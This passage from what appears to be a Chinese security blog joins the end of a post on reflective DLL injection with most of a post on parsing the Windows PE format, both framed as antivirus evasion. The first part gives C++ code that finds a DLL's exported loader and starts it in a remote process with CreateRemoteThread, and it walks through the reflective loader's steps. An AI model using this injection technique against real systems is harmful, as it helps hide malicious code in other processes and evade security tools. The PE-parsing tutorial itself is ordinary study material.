((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;VirtualAddress; RVA = dwRva - VA + ((PIMAGE_SECTION_HEADER)sectionHeader)-&gt;PointerToRawData; &#125; return RVA;&#125; 这里需要说明下IMAGE_EXPORT_DIRECTORY导出表目录结构体 1234567891011121314//@[comment(&quot;MVI_tracked&quot;)]typedef struct _IMAGE_EXPORT_DIRECTORY &#123; DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY; AddressOfNames：函数名称地址DWORD数组，需要RVA AddressOfFunctions：Export函数地址DWORD数组，需要RVA AddressOfNameOrdinals：这是WORD数组，举个例子：目前存在着两个数组，AddressOfNames[i]和AddressOfFunctions[j]，AddressOfNameOrdinals存在的意义就是可以通过下标i找到另一个j，类似数据库中的关系表 拿到AddressOfNames去比较得到i，然后使用i从AddressOfNameOrdinals得到j，最后使用j从AddressOfFunctions找到函数地址 注意得是AddressOfNames是一个DWORD数组，并且需要根据DWORD数据重定位才能得到函数名。 12345678910111213141516171819202122232425262728DWORD64 getFunctionOffset(HANDLE peBuffer, const char* funcionName) &#123; DWORD64 dosHeader = (DWORD64)peBuffer; DWORD64 ntHeader = dosHeader + ((PIMAGE_DOS_HEADER)peBuffer)-&gt;e_lfanew; //导入目录 DWORD64 eatDVA = ((PIMAGE_NT_HEADERS64)ntHeader)-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; DWORD64 exportDirRVA = VA2RVA(eatDVA, dosHeader) + dosHeader; DWORD64 exportNameAddr = VA2RVA(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfNames, dosHeader) + dosHeader; DWORD64 exportFuncAddr = VA2RVA(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfFunctions, dosHeader) + dosHeader; DWORD64 exportOrdinals = VA2RVA(((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;AddressOfNameOrdinals, dosHeader) + dosHeader; DWORD sumNames = ((PIMAGE_EXPORT_DIRECTORY)exportDirRVA)-&gt;NumberOfNames; //1.遍历找到i for (size_t i = 0; i &lt; sumNames; i++) &#123; char* cpExportedFunctionName = (char*)(dosHeader + VA2RVA((PDWORD(exportNameAddr))[i], dosHeader)); std::cout &lt;&lt; &quot;func: &quot; &lt;&lt; cpExportedFunctionName &lt;&lt; &quot;\\n&quot;; if (strstr(cpExportedFunctionName, funcionName)) &#123; exportFuncAddr += (PWORD(exportOrdinals)[i]); return VA2RVA(PDWORD(exportFuncAddr)[0], dosHeader); &#125; &#125; return 0;&#125; 在远程进程中加载 123456789101112131415161718192021222324252627282930DWORD64 loaderFuncAddr = getFunctionOffset(buffer, &quot;loader&quot;);if (loaderFuncAddr == 0) &#123; std::cout &lt;&lt; &quot;Get Export Function Error\\n&quot;; delete[] buffer; VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT); CloseHandle(hFile); CloseHandle(hProcess); return 0;&#125;LPTHREAD_START_ROUTINE lpReflectiveLoader = reinterpret_cast&lt;LPTHREAD_START_ROUTINE&gt;( reinterpret_cast&lt;ULONG_PTR&gt;(pBase) + loaderFuncAddr ); HANDLE hThread = NULL;hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pBase, (DWORD)NULL, NULL);if (hThread == INVALID_HANDLE_VALUE || hThread == NULL) &#123; std::cout &lt;&lt; &quot;Create Thread Failed\\n&quot;; delete[] buffer; VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT); CloseHandle(hFile); CloseHandle(hProcess); return 0;&#125;WaitForSingleObject(hThread, 500); delete[] buffer;VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT);CloseHandle(hFile);CloseHandle(hProcess);CloseHandle(hThread); 这里我是用 https://github.com/stephenfewer/ReflectiveDLLInjection 的DLL进行测试，函数名为ReflectiveLoader 关于PEB PEB：process environment block，处理环境块。可以参考：https://learn.microsoft.com/zh-cn/windows/win32/api/winternl/ns-winternl-peb 1234567typedef struct _PEB &#123;//... BYTE BeingDebugged;//... PPEB_LDR_DATA Ldr;//...&#125; PEB, *PPEB; BeingDebugged：当前是否被调试，反调试和反反调试常用 Ldr：该结构包含有关进程已加载模块的信息 12345678910typedef struct _PEB_LDR_DATA&#123; DWORD dwLength; DWORD dwInitialized; LPVOID lpSsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; LPVOID lpEntryInProgress;&#125; PEB_LDR_DATA, * PPEB_LDR_DATA; 当程序每加载一个dll的时候，就会添加到InMemoryOrderModuleList中（三个LIST_ENTRY都会添加），LIST_ENTRY可以被解析为LDR_DATA_TABLE_ENTRY，因为数据间隔对的上…所以很抽象 12345678typedef struct _LDR_DATA_TABLE_ENTRY &#123; LIST_ENTRY InMemoryOrderLinks;//... PVOID DllBase;//... UNICODE_STRING FullDllName;//...&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY; 通过FullDllName可以得到当前dll的完整名称（带有路径），同时DllBase指向该dll的基地址（即加入到内存中的其实地址） DLL编写 首先就是loader函数，由于我们是在PE文件没有完成映射到内存时进行调用的，那么这段函数本质上和shellcode一样是一段地址无关代码。我们应该明确这段函数能执行以下任务： 获得当前内存地址，方便后续解析PE文件 从peb-&gt;ldr获得相关函数，如GetProcAddress、VirtualAlloc、Loadlibrary等 解析PE文件得到完成映射后的大小并VirtualAlloc分配内存 完成Section段的映射 遍历导入表，使用Loadlibrary加载本dll所需要的各种函数 处理重定位 获得PE文件中AddressOfEntryPoint完成映射后的地址，然后跳转执行 整个过程也是非常枯燥的，以https://github.com/stephenfewer/ReflectiveDLLInjection 举例 获得当前内存地址，方便后续解析PE文件。首先我们要得到当前PE文件的起始部分， 项目是通过#pragma intrinsic返回函数调用的返回地址，然后判断DOS头和NT头是否匹配来逐步调整，得到PE文件起始地址fileBase。 从peb-&gt;ldr获得相关函数。项目为了做到良好的兼容性使用的是__readgsqword和_MoveFromCoprocessor（ARM），函数的作用是从相对于 GS 段开头的偏移量指定的位置读取内存，比如在GS偏移为0x60的位置就是PEB存放的位置，通过遍历PEB中的LDR可以找到所有被加载的dll的相关信息，甚至是在内存中未被映射的PE文件，例如： 项目的这一步做的过程是差不多的， 通过解析kernel32.dll，ntdll.dll的在内存中PE文件，计算出LoadLibraryA，GetProAddress，VritualAlloc，NtFlushInstructionCache三个函数在内存中的位置，便于后续调用。这里的NtFlushInstructionCache函数，用于刷新指定进程的指令缓存 12345NTSTATUS NtFlushInstructionCache( HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T RegionSize); 如果是在用户层使用的话是封装在kernel32.dll的FlushInstructionCache中的，不过直接调用可以避免一些不必要的“检查” 完成映射。现在我们得到了当前dll的PE文件起始位置，可以通过NT头中OptionalHeader的SizeOfImage得到完成映射所需要的空间大小，然后用步骤2中找到的VirtualAlloc申请空间，得到内存映射的起始地址memBase。然后先把DOS头和NT头复制过去，当然头的大小也是由OptionalHeader的SizeOfHeaders可以得到的 完成Section段的映射 这里就不得不复习Section头的结构体了 123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union &#123; DWORD PhysicalAddress; DWORD VirtualSize; &#125; Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; &#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 完成映射的首要问题就是：从哪里，到哪里，走多少。对应的就是从fileBase+PointerToRawData到memBase+VirtualAddress，复制SizeOfRawData大小 遍历导入表。为了便于分析再次展示IMAGE_IMPORT_DESCRIPTOR结构体 1234567891011 typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; DWORD OriginalFirstThunk; &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; DWORD Name; DWORD FirstThunk;&#125; IMAGE_IMPORT_DESCRIPTOR; typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; OriginalFirstThunk：导入名称表的RVA地址 Name：DLL（映像文件）名称 FirstThunk：导入地址表的RVA地址 根据之前我们对PE文件格式的分析，我们首先得到的是DLL的文件名，这时候便可用之前找到的LoadLibraryA去加载这些我们DLL需要的DLL 接着很自然的想到使用GetProAddress去加载这些函数。具体过程是从FirstThunk中获得IMAGE_IMPORT_BY_NAME ，得到函数名称后使用GetProAddress得到函数地址，最后存储到fileBase+PIMAGE_IMPORT_DESCRIPTOR.FirstThunk上。 项目这里对于其他从OriginalFirstThunk开始的情况进行了解析，但是核心思路是一致的。 处理重定位。这里有之前PE文件没有说的PIMAGE_BASE_RELOCATION（主要是之前的例子是EXE） 为什么DLL需要重定位？每个DLL最初被设计时，编译器会为其分配一个首选加载地址（Preferred Base Address），这通常是一个固定的虚拟内存地址。当多个DLL被加载到同一个进程的地址空间时，如果多个DLL的首选加载地址发生冲突（即两个DLL都希望加载到同一个内存地址），操作系统无法直接将它们加载到相同的地址，为了避免这种冲突，操作系统会将其中一个或多个DLL加载到其他地址，这就需要对代码中的绝对地址进行重定位。 他保存在NT头的OptionalHeader.DataDirectory中，结构体如下 1234567//@[comment(&quot;MVI_tracked&quot;)]typedef struct _IMAGE_BASE_RELOCATION &#123; DWORD VirtualAddress; DWORD SizeOfBlock;// WORD TypeOffset[1];&#125; IMAGE_BASE_RELOCATION;typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; VirtualAddress：待修正的数据的起始RVA SizeOfBlock：要修正的区块数目 在PE格式中一个IMAGE_BASE_RELOCATION数组展现的，这也方便我们进行遍历，最后一个全部成员变量都为0，所以计算要重定位的区块数目的时候记得**-1**。 如何进行修正？PIMAGE_BASE_RELOCATION有一个隐藏的成员TypeOffset，可以通过IMAGE_BASE_RELOCATION+ sizeof(IMAGE_BASE_RELOCATION)找到，可以被解析为 12345typedef struct&#123; WORD offset:12; WORD type:4;&#125; IMAGE_RELOC, *PIMAGE_RELOC; 其中重定位的类型主要是构架的不同导致的，如32位和64位 123456789101112131415//// Based relocation types.//#define IMAGE_REL_BASED_ABSOLUTE 0#define IMAGE_REL_BASED_HIGH 1#define IMAGE_REL_BASED_LOW 2#define IMAGE_REL_BASED_HIGHLOW 3#define IMAGE_REL_BASED_HIGHADJ 4#define IMAGE_REL_BASED_MACHINE_SPECIFIC_5 5#define IMAGE_REL_BASED_RESERVED 6#define IMAGE_REL_BASED_MACHINE_SPECIFIC_7 7#define IMAGE_REL_BASED_MACHINE_SPECIFIC_8 8#define IMAGE_REL_BASED_MACHINE_SPECIFIC_9 9#define IMAGE_REL_BASED_DIR64 10 在NT头的可选头(OptionalHeader)中有ImageBase，他是dll加载到内存中的第一个字节的首选地址。那么所有待重定位的数据都是根据这个值相对偏移，比如ImageBase=0x1000，现在有个数据默认是在ImageBase偏移的0x10，即理想中的0x1010的位置，文件中的记录就是0x1010；但是现在ImageBase变为了0x2000，那么重定位的位置就是0x2010，由此得到公式：newData = oldData-ImageBase+newMemoryAddress。 重定位的方式就是在原来的VirtualAddress+IMAGE_RELOC.offset地址中的值加上memBase-ImageBase 获得PE文件中AddressOfEntryPoint完成映射后的地址，然后跳转执行。这几乎是最简单的一步了，直接在NT头的可选头(OptionalHeader)中的AddressOfEntryPoint可以得到，这也是PE文件格式分析中强调过的，就是得算一下偏移；最后刷新指令集缓存（可以忽略，但是会增大dll调用失败概率），跳转到程序入口点AddressOfEntryPoint执行（DLL的就为DllMain了）","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://joe1sn.eu.org/tags/bypass/"}]},{"title":"【免杀】PE文件格式解析","slug":"pe_format","date":"2024-12-01T06:50:28.000Z","updated":"2025-02-27T07:21:01.427Z","comments":true,"path":"2024/12/01/pe_format/","link":"","permalink":"https://joe1sn.eu.org/2024/12/01/pe_format/","excerpt":"公众号：https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ","text":"公众号：https://mp.weixin.qq.com/s/RrEZJDeKXdVqtjZPDs7AyQ 或许我们的公众号会有更多你感兴趣的内容 PE文件格式解析 假如说我们要自己写一个exe文件的加载器，或者你曾好奇过反汇编软件的原理，这就需要对exe对应的PE(Portable Executable)文件格式加以理解。这里以windows10中自带的notepad.exe进行讲解。 ​ 这里：https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format 是微软官方对PE格式的官方文档，读者可自行了解。 如何确定是一个PE文件-DOS头 对于一个PE文件，首先是他的文件头，也叫DOS 头，结构体定义如下 12345typedef struct _IMAGE_DOS_HEADER &#123; // DOS .EXE header WORD e_magic; // Magic number //.... LONG e_lfanew; // File address of new exe header &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER; e_magic：魔数，如果为MZ这个值说明DOS头正确 e_lfanew：指向下一个头，即NT头的位置，计算方式：NT_HEADER=FileStart+e_lfanewNT\\_HEADER = FileStart+e\\_lfanewNT_HEADER=FileStart+e_lfanew 1234567891011121314151617const std::string filePath = &quot;notepad.exe&quot;;std::ifstream inputFile(filePath, std::ios::in | std::ios::binary);if (!inputFile.is_open()) &#123; std::cerr &lt;&lt; &quot;cant open: &quot; &lt;&lt; filePath &lt;&lt; std::endl; return 1;&#125;std::ostringstream peFileString;peFileString &lt;&lt; inputFile.rdbuf();std::string fileContent = peFileString.str();inputFile.close();IMAGE_DOS_HEADER* dosHeader = \\ (PIMAGE_DOS_HEADER)(DWORD64)(&amp;fileContent[0]);std::cout &lt;&lt; std::hex;std::cout &lt;&lt; &quot;PE e_magic : 0x&quot; &lt;&lt; dosHeader-&gt;e_magic &lt;&lt; &quot;\\n&quot;;std::cout &lt;&lt; &quot;PE e_lfanew : 0x&quot; &lt;&lt; dosHeader-&gt;e_lfanew &lt;&lt; &quot;\\n&quot;; 如何判断程序位数,找到代码段等 上面说到我们通过e_lfanew找到了NT Header，这里我们先假设他是一个64位程序的PE文件 12345typedef struct _IMAGE_NT_HEADERS64 &#123; DWORD Signature; //标签，说明这是NT头 IMAGE_FILE_HEADER FileHeader; //文件头,重要 IMAGE_OPTIONAL_HEADER64 OptionalHeader; //可选项头&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; 这里主要功能是通过FileHeader来实现的 123456789typedef struct _IMAGE_FILE_HEADER &#123; WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics;&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; 判断程序位数-NT头 首先，使用IMAGE_FILE_HEADER.Machine可以很轻松的判断 12345678IMAGE_NT_HEADERS64* ntTempHeader = \\ (PIMAGE_NT_HEADERS64)(DWORD64)(&amp;fileContent[dosHeader-&gt;e_lfanew]);SetConsoleOutputCP(CP_UTF8);std::cout &lt;&lt; &quot;程序位数 : &quot;;if (ntTempHeader-&gt;FileHeader.Machine == 0x8664) std::cout &lt;&lt; &quot;64位\\n&quot;;else if (ntTempHeader-&gt;FileHeader.Machine == 0x014c) std::cout &lt;&lt; &quot;32位\\n&quot;; 更多架构的类型说明在：https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#machine-types 解析代码段-段头部 这里由于已知是64位程序继续按照64位的讲下去 使用IMAGE_FILE_HEADER.NumberOfSections获得区段数量 找到各个section的位置，计算公式：section[i]=NT_HEADER+ntHeadSize+i∗sectionHeadSizesection[i]=NT\\_HEADER+ntHeadSize+i*sectionHeadSizesection[i]=NT_HEADER+ntHeadSize+i∗sectionHeadSize 12345678910std::cout &lt;&lt; &quot;区段数量: &quot; &lt;&lt; ntTempHeader-&gt;FileHeader.NumberOfSections &lt;&lt; &quot;\\n&quot;;int nt_head_file_start = dosHeader-&gt;e_lfanew;for (size_t i = 0; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)&#123; std::cout &lt;&lt; &quot; Section[&quot; &lt;&lt; i &lt;&lt; &quot;] address: 0x&quot; &lt;&lt; nt_head_file_start \\ + sizeof(IMAGE_NT_HEADERS64) \\ + i * sizeof(IMAGE_SECTION_HEADER) &lt;&lt; &quot;\\n&quot;;&#125; 再对每个IMAGE_SECTION_HEADER进行解析就能得到相关信息 那么关于IMAGE_SECTION_HEADER 123456789101112131415typedef struct _IMAGE_SECTION_HEADER &#123; BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union &#123; DWORD PhysicalAddress; DWORD VirtualSize; &#125; Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics;&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER; 这里来到第一个难点：VirtualAddress，简称 VA，这里用.text段也即第一个section来探索 1234567891011121314151617int nt_head_file_start = dosHeader-&gt;e_lfanew;for (size_t i = 0; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)&#123; DWORD64 sectionFileAddr = \\ nt_head_file_start \\ + sizeof(IMAGE_NT_HEADERS64) \\ + i * sizeof(IMAGE_SECTION_HEADER); IMAGE_SECTION_HEADER* sectionHeader = \\ (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]); std::cout &lt;&lt; &quot; Section[&quot; &lt;&lt; i &lt;&lt; &quot;] address: 0x&quot; &lt;&lt; \\ sectionFileAddr &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot; Section[&quot; &lt;&lt; i &lt;&lt; &quot;] name : &quot; &lt;&lt; \\ sectionHeader-&gt;Name &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot; Section[&quot; &lt;&lt; i &lt;&lt; &quot;] VA : &quot; &lt;&lt; \\ sectionHeader-&gt;VirtualAddress &lt;&lt; &quot;\\n&quot;;&#125; 在CFF Explorer中，这些区段的低位和我们解析的地址是相同的，说明：VA是程序运行后，相对于rebase的偏移，在微软的文档中是这样说明的： 加载到内存中的节的第一个字节的地址，相对于映像基。 对于对象文件，这是应用重定位之前第一个字节的地址。 同样的VirtualSize选项可以得到改区段的大小，从而得到区段结束位置 1Misc.VirtualSize 加载到内存中的节的总大小（以字节为单位）。 如果此值大于 SizeOfRawData 成员，则节将填充零。 此字段仅对可执行映像有效，对于对象文件，应设置为 0。 利用在IMAGE_SECTION_HEADER中有一个PointerToRawData可以找到相关数据在文件中的位置， FileAddr=section.PointerToRawDataFileAddr=section.PointerToRawDataFileAddr=section.PointerToRawData，就是直接从文件最开始相加就得到位置了 123456789101112std::cout &lt;&lt; &quot;区段数量: &quot; &lt;&lt; ntTempHeader-&gt;FileHeader.NumberOfSections &lt;&lt; &quot;\\n&quot;;int nt_head_file_start = dosHeader-&gt;e_lfanew;for (size_t i = 0; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)&#123; DWORD64 sectionFileAddr = nt_head_file_start + sizeof(IMAGE_NT_HEADERS64) + i * sizeof(IMAGE_SECTION_HEADER); IMAGE_SECTION_HEADER* sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]); std::cout &lt;&lt; &quot; Section[&quot; &lt;&lt; i &lt;&lt; &quot;] address: 0x&quot; &lt;&lt; sectionFileAddr &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot; name : &quot; &lt;&lt; sectionHeader-&gt;Name &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot; VA : 0x&quot; &lt;&lt; sectionHeader-&gt;VirtualAddress &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot; ptr2RawData : 0x&quot; &lt;&lt; sectionHeader-&gt;PointerToRawData &lt;&lt; &quot;\\n&quot;;&#125; 如何找到导入的函数和DLL-导入表 在编程中会使用到其他dll文件的函数，例如kernel.dll、CRuntimeLib.dll，PE文件通过一个导入目录（IAT）进行索引 在编写程序时，我们往往需要在程序中内置部分资源，甚至在上述的section遍历中我们也发现了许多的section，每一个不同的section都会存储不同类型的数据，比如 代码段：包含可执行的程序代码。 数据段：包含初始化数据。 导入表：指定外部符号，告诉操作系统需要哪些外部函数。 导出表：列出了程序导出的函数，供其他程序调用。 资源表：包含程序使用的各种资源，如图标、对话框、字符串等。 回到一开始 NT头的OptionalHeader部分 123456typedef struct _IMAGE_OPTIONAL_HEADER64 &#123; //... DWORD AddressOfEntryPoint; //... IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64; AddressOfEntryPoint：指向入口点函数（相对于图像基址）的指针 DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]：指向数据目录中第一 个IMAGE_DATA_DIRECTORY 结构的指针 DataDirectory 存储了这些不同区域在文件中的位置和大小，因此它是一个“目录”或“索引”，指示每个数据段的位置。关于具体类型在该数组下的取值可以参考：https://learn.microsoft.com/zh-cn/windows/win32/api/winnt/ns-winnt-image_optional_header32 具体的IMAGE_DATA_DIRECTORY结构体如下： 1234typedef struct _IMAGE_DATA_DIRECTORY &#123; DWORD VirtualAddress; DWORD Size;&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY; 选择几个查看一下 1234std::cout &lt;&lt; &quot;---OptionalHeader.DataDirectories\\n&quot;;std::cout &lt;&lt; &quot;基本重定位表 : 0x&quot; &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress &lt;&lt; &quot;\\n&quot;;std::cout &lt;&lt; &quot;全局指针的相对虚拟地址 : 0x&quot; &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_GLOBALPTR].VirtualAddress &lt;&lt; &quot;\\n&quot;;std::cout &lt;&lt; &quot;导入地址表 : 0x&quot; &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress &lt;&lt; &quot;\\n&quot;; **注意：**这里的IMAGE_DIRECTORY_ENTRY_IAT和IMAGE_DIRECTORY_ENTRY_IMPORT是两个东西 后续使用的是IMAGE_DIRECTORY_ENTRY_IMPORT 貌似依然是在内存中的虚拟地址，我们姑且将其称为DVA（datadirectory virtual adresss）。 那么如何通过IMAGE_OPTIONAL_HEADER64找到IAT呢？首先IAT的相关信息是一定存在文件中的，就不可避免地要计算偏移，将这个偏移设置为RVA 结合IMAGE_SECTION_HEADER中有一个PointerToRawData RVA=DVA−VA+PtrToRawDataRVA=DVA-VA+PtrToRawDataRVA=DVA−VA+PtrToRawData 这里以导入地址表为例 12345678910111213141516DWORD64 iatDVA = ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;DWORD64 iatVA = 0;DWORD64 iatRVA = 0;DWORD64 sectionFileAddr;IMAGE_SECTION_HEADER* sectionHeader;for (size_t i = 0; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++)&#123; sectionFileAddr = nt_head_file_start + sizeof(IMAGE_NT_HEADERS64) + i * sizeof(IMAGE_SECTION_HEADER); sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]); if (sectionHeader-&gt;VirtualAddress &gt; iatDVA) break; iatVA = sectionHeader-&gt;VirtualAddress; iatRVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData;&#125; 如何使用RVA？ RVA就是从文件开始IAT的基地址，所有IMAGE_IMPORT_DESCRIPTOR结构体都是从此开始找的。但是并没有相关变量说明了总数，那么只能依靠IMAGE_IMPORT_DESCRIPTOR的变量名来查找了，自然想到的就是Name为0就退出 对于IMAGE_IMPORT_DESCRIPTOR结构体 1234567891011typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123; union &#123; DWORD Characteristics; // 0 for terminating null import descriptor DWORD OriginalFirstThunk; // RVA to original unbound IAT (PIMAGE_THUNK_DATA) &#125; DUMMYUNIONNAME; DWORD TimeDateStamp; DWORD ForwarderChain; // -1 if no forwarders DWORD Name; DWORD FirstThunk; // RVA to IAT (if bound this IAT has actual addresses)&#125; IMAGE_IMPORT_DESCRIPTOR;typedef IMAGE_IMPORT_DESCRIPTOR UNALIGNED *PIMAGE_IMPORT_DESCRIPTOR; 那么想办法打印IMAGE_IMPORT_DESCRIPTOR的结构体名称，可以由公式NameOffset=Name−VA+PtrToRawDataNameOffset = Name -VA+PtrToRawDataNameOffset=Name−VA+PtrToRawData，**这个公式很重要，**直接打印文件NameOffset偏移的数据即可 首先重新编写从VA到RVA的函数 1234567891011121314151617181920DWORD64 dwVAToRVA(DWORD64 StartVA, DWORD64 nt_head_file_start, std::string&amp; fileContent, PIMAGE_NT_HEADERS64 ntTempHeader) &#123; DWORD64 iatDVA = StartVA; DWORD64 iatVA = 0; DWORD64 RVA = 0; DWORD64 sectionFileAddr; IMAGE_SECTION_HEADER* sectionHeader; for (size_t i = 0; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++) &#123; sectionFileAddr = nt_head_file_start + sizeof(IMAGE_NT_HEADERS64) + i * sizeof(IMAGE_SECTION_HEADER); sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]); if (sectionHeader-&gt;VirtualAddress &gt; iatDVA) break; iatVA = sectionHeader-&gt;VirtualAddress; RVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData; &#125; return RVA;&#125; 在main函数中打印 12345678910size_t i = 0;PIMAGE_IMPORT_DESCRIPTOR temp = PIMAGE_IMPORT_DESCRIPTOR((DWORD64)&amp;fileContent[0] + iatRVA + i * sizeof(IMAGE_IMPORT_DESCRIPTOR));for (i = 1; temp-&gt;Name != 0; i++)&#123; DWORD64 VA = dwVAToRVA(temp-&gt;Name, nt_head_file_start, fileContent, ntTempHeader); std::cout &lt;&lt; &quot; DLL: &quot; &lt;&lt; (char*)(&amp;fileContent[VA]) &lt;&lt; &quot;\\n&quot;; temp = PIMAGE_IMPORT_DESCRIPTOR(&amp;fileContent[0] + iatRVA + i * sizeof(IMAGE_IMPORT_DESCRIPTOR));&#125; 同理，IMAGE_IMPORT_DESCRIPTOR中的FirstThunk也可以用于打印导入的函数名，也是将FirstThunk转为RVA，然后直接在源文件中查找RVA位置的字符串即可 123456789101112131415161718size_t i = 0;PIMAGE_IMPORT_DESCRIPTOR temp = PIMAGE_IMPORT_DESCRIPTOR((DWORD64)&amp;fileContent[0] + iatRVA + i * sizeof(IMAGE_IMPORT_DESCRIPTOR));for (i = 1; temp-&gt;Name != 0; i++)&#123; DWORD64 VA = dwVAToRVA(temp-&gt;Name, nt_head_file_start, fileContent, ntTempHeader); std::cout &lt;&lt; &quot; DLL: &quot; &lt;&lt; (char*)(&amp;fileContent[VA]) &lt;&lt; &quot;\\n&quot;; VA = *PDWORD64(&amp;fileContent[0] + dwVAToRVA(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader)); for (size_t i = 1; VA != 0; i++) &#123; PIMAGE_IMPORT_BY_NAME IatName = PIMAGE_IMPORT_BY_NAME(&amp;fileContent[0] + dwVAToRVA(VA, nt_head_file_start, fileContent, ntTempHeader)); std::cout &lt;&lt; &quot; -Function &quot; &lt;&lt; IatName-&gt;Name &lt;&lt; std::endl; VA = *PDWORD64(&amp;fileContent[0] + dwVAToRVA(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader) + i * sizeof(DWORD64)); &#125; temp = PIMAGE_IMPORT_DESCRIPTOR(&amp;fileContent[0] + iatRVA + i * sizeof(IMAGE_IMPORT_DESCRIPTOR));&#125; 其他类型的IMAGE_DATA_DIRECTORY也是使用类似的方法就可以找到在静态二进制文件中的位置 最后 完整code: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;fstream&gt;#include &lt;sstream&gt;#include &lt;string&gt;DWORD64 dwVAToRVA(DWORD64 StartVA, DWORD64 nt_head_file_start, std::string&amp; fileContent, PIMAGE_NT_HEADERS64 ntTempHeader) &#123; DWORD64 iatDVA = StartVA; DWORD64 iatVA = 0; DWORD64 RVA = 0; DWORD64 sectionFileAddr; IMAGE_SECTION_HEADER* sectionHeader; for (size_t i = 0; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++) &#123; sectionFileAddr = nt_head_file_start + sizeof(IMAGE_NT_HEADERS64) + i * sizeof(IMAGE_SECTION_HEADER); sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]); if (sectionHeader-&gt;VirtualAddress &gt; iatDVA) break; iatVA = sectionHeader-&gt;VirtualAddress; RVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData; &#125; return RVA;&#125;int main() &#123; const 